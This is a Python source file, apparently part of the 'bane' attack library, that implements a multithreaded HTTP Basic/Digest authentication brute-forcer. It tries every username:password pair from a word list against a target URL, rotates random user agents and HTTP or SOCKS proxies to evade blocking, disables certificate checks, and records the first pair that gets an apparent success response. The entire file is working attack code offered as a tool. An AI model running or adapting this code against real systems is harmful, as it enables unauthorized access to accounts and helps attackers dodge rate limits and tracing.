from bane.bruteforce.utils import *

class http_auth_bruteforce:
    __slots__ = ["logs", "stop", "finish", "result"]

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        domain=None,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None
        ):
        word_list=load_word_list(word_list)
        proxies=get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        self.stop = False
        self.logs = logs
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                domain,
                word_list,
                logs,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(
        self, u, domain, word_list, logs, proxies, cookie, user_agent, timeout,headers
    ):
        if user_agent:
            us = user_agent
        else:
            us = random.choice(ua)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        prox = random.choice(proxies)
            #prox = {"http": "http://" + prox, "https": "http://" + prox}
        try:
            if self.logs == True:
                print("[*]Checking Authentication Type:")
            resp = requests.Session().get(
                u, proxies=prox, headers=hed, verify=False, timeout=timeout
            )
            if "basic" in resp.headers["WWW-Authenticate"].lower():
                if self.logs == True:
                    print("==>Basic")
                auth_type = requests.auth.HTTPBasicAuth
            elif "digest" in resp.headers["WWW-Authenticate"].lower():
                if self.logs == True:
                    print("==>Digest")
                auth_type = requests.auth.HTTPDigestAuth
                """elif 'ntlm' in resp.headers['WWW-Authenticate'].lower():
    if self.logs==True:
     print("==>Ntlm")
    auth_type = requests_ntlm.HttpNtlmAuth
    if not domain:
     raise Exception('You need to specify a domain for "Ntlm" authentication !\n\nbane.http_auth_bruteforce("http://example.com",domain="example.com",.....)')"""
            else:
                if self.logs == True:
                    print("==>Unknown type")
                self.finish = True
                return
        except:
            if self.logs == True:
                print("bane doesn't support this type of authentication")
            self.finish = True
            return
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(":")[0]
                """if domain and auth_type==requests_ntlm.HttpNtlmAuth:
     username=domain+'\\'+username"""
                password = x.split(":")[1]
                if self.logs == True:
                    print("[*]Trying: {} {}".format(username, password))
                prox = None
                if proxies:
                    prox = random.choice(proxies)
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(ua)
                hed = {"User-Agent": us}
                if cookie:
                    hed.update({"Cookie": cookie})
                r = requests.Session().get(
                    u,
                    auth=auth_type(username, password),
                    proxies=prox,
                    headers=hed,
                    verify=False,
                    timeout=timeout,
                )
                if (
                    (r.status_code == 200)
                    and ("required" not in r.text.lower())
                    and ("wrong" not in r.text.lower())
                    and ("invalid" not in r.text.lower())
                    and ("denied" not in r.text.lower())
                    and ("unauthorized" not in r.text.lower())
                ):
                    if self.logs == True:
                        print("[+]Success")
                    self.result = {u: username + ":" + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print("[-]Fail")
            except Exception as ex:
                if self.logs == True:
                    print("[-]Fail")
        self.finish = True
